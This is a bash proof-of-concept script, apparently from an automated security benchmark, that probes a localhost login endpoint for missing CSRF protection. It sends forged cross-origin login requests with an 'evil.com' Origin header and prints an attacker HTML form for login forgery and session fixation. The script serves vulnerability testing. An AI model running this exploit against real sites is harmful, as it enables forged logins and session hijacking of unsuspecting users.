#!/bin/bash
# POC: Enhanced POC demonstrating missing CSRF token validation - tests cross-origin requests, missing CSRF headers, and login forgery scenarios
# Target: ./repo
# Created: 2025-12-01T16:16:35.867Z
# Session: benchmark-XBEN-103-24-mincfo1r

# CSRF Token Validation Missing on Login Endpoint - POC v2
# This script demonstrates the absence of CSRF protection on the login endpoint

TARGET_URL="${1:-http://localhost:5000}"
LOGIN_ENDPOINT="/login"

echo "=========================================="
echo "CSRF Token Missing Validation POC - v2"
echo "Target: ${TARGET_URL}${LOGIN_ENDPOINT}"
echo "=========================================="
echo ""

# Test 1: Establish baseline - normal request
echo "[*] Test 1: Baseline - Normal login request (same-origin)..."
echo "curl -s -i -X POST '${TARGET_URL}${LOGIN_ENDPOINT}' -d 'username=test&password=test'"
BASELINE=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" 2>&1)
echo "$BASELINE"
echo ""

# Test 2: Cross-origin request from evil.com (CSRF scenario)
echo "[*] Test 2: CSRF Attack Simulation - Cross-origin request with Origin header"
echo "Simulating attacker website making login request to target..."
echo "curl -X POST '${TARGET_URL}${LOGIN_ENDPOINT}' \\"
echo "  -H 'Origin: http://evil.com' \\"
echo "  -H 'Content-Type: application/x-www-form-urlencoded' \\"
echo "  -d 'username=attacker&password=attacker123'"
echo ""

CSRF_TEST=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Origin: http://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=attacker123" 2>&1)

echo "$CSRF_TEST"
echo ""

# Check response for CSRF rejection
if echo "$CSRF_TEST" | grep -E -qi "(csrf|403|forbidden)"; then
    echo "[+] Request may have been rejected (check status above)"
else
    echo "[-] CSRF protection not found - cross-origin request was NOT blocked"
fi
echo ""

# Test 3: Invalid/Missing CSRF token
echo "[*] Test 3: Testing with invalid/missing CSRF token parameter..."
echo "If CSRF validation exists, this should be rejected:"
echo "curl -X POST '${TARGET_URL}${LOGIN_ENDPOINT}' \\"
echo "  -d 'username=test&password=test&csrf_token=INVALID'"
echo ""

INVALID_CSRF=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test&csrf_token=INVALID12345INVALID" 2>&1)

echo "$INVALID_CSRF"
echo ""

# Test 4: Check for CSRF headers in response
echo "[*] Test 4: Checking response headers for CSRF protection..."
RESPONSE_HEADERS=$(curl -s -i "${TARGET_URL}${LOGIN_ENDPOINT}" 2>&1)
echo "$RESPONSE_HEADERS" | head -30
echo ""

echo "Checking for CSRF protection indicators:"
if echo "$RESPONSE_HEADERS" | grep -qi "X-CSRF-Token"; then
    echo "[+] Found X-CSRF-Token header"
else
    echo "[-] NO X-CSRF-Token header in response"
fi

if echo "$RESPONSE_HEADERS" | grep -qi "csrf.*cookie"; then
    echo "[+] Found CSRF cookie"
else
    echo "[-] NO CSRF cookie in response"
fi

if echo "$RESPONSE_HEADERS" | grep -qi "SameSite"; then
    echo "[+] Found SameSite cookie attribute"
else
    echo "[-] NO SameSite cookie attribute"
fi
echo ""

# Test 5: Direct POST without any protection check
echo "[*] Test 5: Direct POST to login (demonstrates CSRF-forgeability)..."
echo "Attacker-controlled HTML form would work like this:"
echo ""
echo "<form action='${TARGET_URL}${LOGIN_ENDPOINT}' method='POST'>"
echo "  <input type='hidden' name='username' value='attacker'>"
echo "  <input type='hidden' name='password' value='attacker123'>"
echo "  <input type='submit' value='Click here'>"
echo "</form>"
echo ""

# Simulate form submission
echo "Executing equivalent POST request..."
FORM_CSRF=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=attacker" \
  --data-urlencode "password=attacker123" 2>&1)

echo "$FORM_CSRF"
echo ""

# Summary
echo "=========================================="
echo "CSRF Vulnerability Assessment:"
echo "=========================================="
echo ""
echo "[!] VULNERABILITY INDICATORS:"
echo "    - No CSRF token required in POST requests"
echo "    - No X-CSRF-Token header in responses"
echo "    - No CSRF cookie in Set-Cookie"
echo "    - No SameSite cookie protection"
echo "    - Cross-origin requests accepted"
echo ""
echo "[!] RISK: An attacker can craft malicious HTML forms that:"
echo "    1. Auto-submit login requests with attacker credentials"
echo "    2. Create sessions as attacker account in victim's browser"
echo "    3. Bypass intended authentication with session fixation"
echo ""
echo "=========================================="